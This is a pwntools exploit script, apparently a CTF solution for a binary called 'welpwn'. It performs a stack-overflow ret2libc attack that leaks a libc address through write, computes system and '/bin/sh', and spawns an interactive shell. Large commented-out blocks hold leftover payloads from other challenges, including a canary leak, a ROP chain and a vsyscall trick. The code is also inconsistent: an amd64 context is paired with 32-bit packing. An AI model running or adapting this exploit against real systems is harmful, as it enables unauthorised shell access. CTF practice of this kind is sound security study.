
from pwn import *
from ctypes import *
from LibcSearcher import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
# sh = process('./ret2libc164')
elf = ELF('./welpwn')
# readgot=elf.got['read']
# putsplt=elf.plt['puts']
# #ROPgadget - -binary 100levels - -only "pop|ret"
# pop_rdi =0x0000000000001033
# ret_addr = elf.symbols['__libc_start_main']
# main_addr = elf.symbols['main']
# main_addr =0x0000000000400908
# rdi = 0x0000000000400a93
# io = remote("111.200.241.244",63321)
io = process("./welpwn")
io.recvuntil('Welcome to RCTF\n')

write_plt = elf.plt['write']
write_got = elf.got['write']
ret_addr = 0x08048484
payload = 'a' * 0x6c + 'b' * 0x4 + p32(write_plt) + p32(ret_addr) + p32(0x1) + p32(write_got) + p32(0x4)
io.sendline(payload)
write_addr = u32(io.recv(4))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
print('libc_base:',hex(libc_base))
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * 0x6c + 'b' * 0x4 + p32(system_addr) + p32(ret_addr) + p32(binsh_addr)
io.sendline(payload)
# gdb.attach(io)
# io.recv()
# sys_addr = libc.symbols['system']
# execv_gadget = 0x4526a
# offset_addr = execv_gadget - sys_addr
# io.sendlineafter('Choice:\n', '2')
# io.sendlineafter('Choice:\n', '1')
# io.sendlineafter('How many levels?\n', '0')
# io.sendafter('Any more?\n',str(offset_addr))
# # io.recvuntil('Answer:')
#
# vsyscall = 0xffffffffff600000
#
# for i in range(0, 99):
#     io.recvuntil('Question: ')
#     a = int(io.recvuntil(' '))
#     io.recvuntil('* ')
#     b = int(io.recvuntil(' '))
#     io.sendlineafter('Answer:', str(a * b))
#
# payload = 'a' * 0x38 + p64(vsyscall) * 3
#
# io.sendafter('Answer:', payload)


# info = io.recvline()
# log.info("info => %s", info)
#
# io.sendlineafter('--------\n>> ', '2')
# info = io.recvline()
# log.info("info => %s", info)
# canary = u64(io.recvn(7).rjust(8, '\x00'))
# # log.info("canary => %#x", canary)
# # canary = u64(io.recvn(7).rjust(8,'\x00'))
# print('canary:',hex(canary))
# pause()
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(readgot) + p64(putsplt) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')
# read_addr = u64(io.recv(6).ljust(8,'\x00'))
# print('read_addr :',hex(read_addr))
# libc = LibcSearcher('read', read_addr)
# libc_base = read_addr - libc.dump('read')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')
# log.info("system_addr => %#x", system_addr)
# log.info("binsh_addr => %#x", binsh_addr)
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')


io.interactive()
